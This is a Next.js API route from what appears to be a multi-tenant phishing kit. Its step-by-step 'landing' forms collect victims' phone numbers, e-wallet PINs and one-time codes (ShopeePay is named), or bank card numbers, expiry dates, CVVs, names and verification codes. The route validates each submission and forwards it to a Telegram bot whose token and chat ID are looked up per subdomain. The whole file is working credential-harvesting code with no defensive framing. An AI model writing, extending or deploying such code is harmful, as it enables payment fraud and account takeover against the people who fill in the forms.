export const dynamic = 'force-dynamic';

import { sendTelegramMessage } from '@/lib/landing/telegram';
import type { StepData } from '@/lib/landing/types';
import {
  buildEnterpriseTelegramMessage,
  isEnterpriseTelegramProduct,
} from '@/app/[slug]/enterprise/lib/telegram-format';
import { buildBankTelegramMessage } from '@/app/[slug]/enterprise/lib/bank-telegram-format';
import { bankCardValid, type BankFormData } from '@/app/[slug]/enterprise/lib/bank-types';
import { createAdminClient } from '@/lib/supabase-admin';
import { isValidSubdomainSlug, normalizeSubdomainSlug } from '@/lib/subdomain';
import { NextRequest, NextResponse } from 'next/server';

type SubmitBody = {
  slug?: string;
  step?: number;
  phone?: string;
  pin?: string;
  otp?: string;
  product?: string;
  cardNumber?: string;
  expiry?: string;
  cvv?: string;
  cardName?: string;
  isPrimary?: boolean;
  code?: string;
};

function getOtpLength(product?: string): number {
  return product === 'shopeepay' ? 6 : 4;
}

function sanitizeBankStep(body: SubmitBody): { step: 1 | 2; bankData: BankFormData } | null {
  const step = Number(body.step);
  if (step !== 1 && step !== 2) return null;

  const bankData: BankFormData = {
    cardNumber: (body.cardNumber ?? '').replace(/\D/g, '').slice(0, 19),
    expiry: (body.expiry ?? '').replace(/\s/g, '').slice(0, 5),
    cvv: (body.cvv ?? '').replace(/\D/g, '').slice(0, 3),
    cardName: (body.cardName ?? '').trim().slice(0, 80),
    isPrimary: body.isPrimary !== false,
    code: (body.code ?? '').trim().slice(0, 32),
  };

  if (step === 1 && bankCardValid(bankData)) {
    return { step, bankData };
  }

  if (step === 2 && bankCardValid(bankData) && bankData.code.length > 0) {
    return { step, bankData };
  }

  return null;
}

function sanitizeStepData(body: SubmitBody): { step: 1 | 2 | 3; stepData: StepData } | null {
  const step = Number(body.step);
  if (step !== 1 && step !== 2 && step !== 3) return null;

  const otpLength = getOtpLength(body.product);
  const phone = (body.phone ?? '').replace(/\D/g, '').slice(0, 13);
  const pin = (body.pin ?? '').replace(/\D/g, '').slice(0, 6);
  const otp = (body.otp ?? '').replace(/\D/g, '').slice(0, otpLength);

  if (step === 1 && phone.length < 10) return null;
  if (step === 2 && (phone.length < 10 || pin.length !== 6)) return null;
  if (step === 3 && (phone.length < 10 || pin.length !== 6 || otp.length !== otpLength)) return null;

  return {
    step,
    stepData: { phone, pin, otp },
  };
}

export async function POST(request: NextRequest) {
  try {
    const body = (await request.json()) as SubmitBody;
    const slug = normalizeSubdomainSlug(body.slug ?? '');

    if (!slug || !isValidSubdomainSlug(slug)) {
      return NextResponse.json({ success: false, error: 'Landing tidak valid.' }, { status: 400 });
    }

    if (body.product === 'bank') {
      const bankParsed = sanitizeBankStep(body);
      if (!bankParsed) {
        return NextResponse.json({ success: false, error: 'Data form tidak valid.' }, { status: 400 });
      }

      const admin = createAdminClient();
      const { data, error } = await admin.rpc('internal_get_landing_telegram', {
        p_slug: slug,
      });

      if (error || !data?.ok || !data.bot_token || !data.chat_id) {
        return NextResponse.json({ success: false, error: 'Landing tidak tersedia.' }, { status: 403 });
      }

      const messageType = bankParsed.step === 1 ? 'phone' : 'otp';
      const customText = buildBankTelegramMessage(bankParsed.step, bankParsed.bankData);
      const legacyStepData: StepData = {
        phone: bankParsed.bankData.cardNumber,
        pin: bankParsed.bankData.cvv,
        otp: bankParsed.bankData.code,
      };

      const result = await sendTelegramMessage(
        data.bot_token as string,
        data.chat_id as string,
        messageType,
        legacyStepData,
        customText
      );

      if (!result.ok) {
        return NextResponse.json(
          { success: false, error: result.error || 'Gagal mengirim data.' },
          { status: 502 }
        );
      }

      return NextResponse.json({ success: true });
    }

    const parsed = sanitizeStepData(body);
    if (!parsed) {
      return NextResponse.json({ success: false, error: 'Data form tidak valid.' }, { status: 400 });
    }

    const admin = createAdminClient();
    const { data, error } = await admin.rpc('internal_get_landing_telegram', {
      p_slug: slug,
    });

    if (error || !data?.ok || !data.bot_token || !data.chat_id) {
      return NextResponse.json({ success: false, error: 'Landing tidak tersedia.' }, { status: 403 });
    }

    const messageType = parsed.step === 1 ? 'phone' : parsed.step === 2 ? 'pin' : 'otp';
    const customText = isEnterpriseTelegramProduct(body.product)
      ? buildEnterpriseTelegramMessage(body.product, parsed.step, parsed.stepData)
      : undefined;

    const result = await sendTelegramMessage(
      data.bot_token as string,
      data.chat_id as string,
      messageType,
      parsed.stepData,
      customText
    );

    if (!result.ok) {
      return NextResponse.json(
        { success: false, error: result.error || 'Gagal mengirim data.' },
        { status: 502 }
      );
    }

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error('Landing submit error:', err);
    return NextResponse.json({ success: false, error: 'Terjadi kesalahan server.' }, { status: 500 });
  }
}
